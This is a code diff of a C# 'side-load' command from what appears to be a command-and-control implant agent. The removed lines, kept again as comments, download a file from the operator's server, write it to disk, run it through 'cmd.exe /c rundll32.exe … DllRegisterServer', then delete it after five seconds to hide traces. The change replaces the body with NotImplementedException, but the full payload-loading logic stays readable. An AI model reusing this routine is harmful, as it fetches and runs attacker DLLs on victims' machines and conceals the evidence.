@@ -1,5 +1,4 @@
-﻿using Agent.Internal;
-using Agent.Models;
+﻿using Agent.Models;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -14,41 +13,42 @@ namespace Agent.Commands
     {
         public override string Name => "side-load";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            var fileName = task.FileName;
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
+            throw new NotImplementedException();
+            //var fileName = task.FileName;
+            //var fileContent = context.MessageServiceDownload(task.FileId, a =>
+            //{
+            //    result.Info = $"Downloading {fileName} ({a}%)";
+            //    context.MessageServiceSendResult(result);
+            //}).Result;
 
-            this.Notify(result, commm, $"{fileName} Downloaded");
+            //this.Notify(result, commm, $"{fileName} Downloaded");
 
 
-            string path = string.Empty;
-            if (task.SplittedArgs.Length > 1)
-            {
-                path = task.SplittedArgs[1];
-            }
-            else
-            {
-                path = Path.Combine(Environment.CurrentDirectory, Path.GetFileName(fileName));
-            }
+            //string path = string.Empty;
+            //if (task.SplittedArgs.Length > 1)
+            //{
+            //    path = task.SplittedArgs[1];
+            //}
+            //else
+            //{
+            //    path = Path.Combine(Environment.CurrentDirectory, Path.GetFileName(fileName));
+            //}
 
-            using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write))
-            {
-                fs.Write(fileContent, 0, fileContent.Length);
-            }
+            //using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write))
+            //{
+            //    fs.Write(fileContent, 0, fileContent.Length);
+            //}
 
-            this.Notify(result, commm, $"File saved to { path}");
+            //this.Notify(result, commm, $"File saved to { path}");
 
-            Executor.ExecuteCommand(@"c:\windows\system32\cmd.exe", $"/c  rundll32.exe {path},DllRegisterServer");
+            //Executor.ExecuteCommand(@"c:\windows\system32\cmd.exe", $"/c  rundll32.exe {path},DllRegisterServer");
 
-            Thread.Sleep(5000);
+            //Thread.Sleep(5000);
 
-            File.Delete(path);
-            this.Notify(result, commm, $"File deleted");
+            //File.Delete(path);
+            //this.Notify(result, commm, $"File deleted");
         }
     }
 }
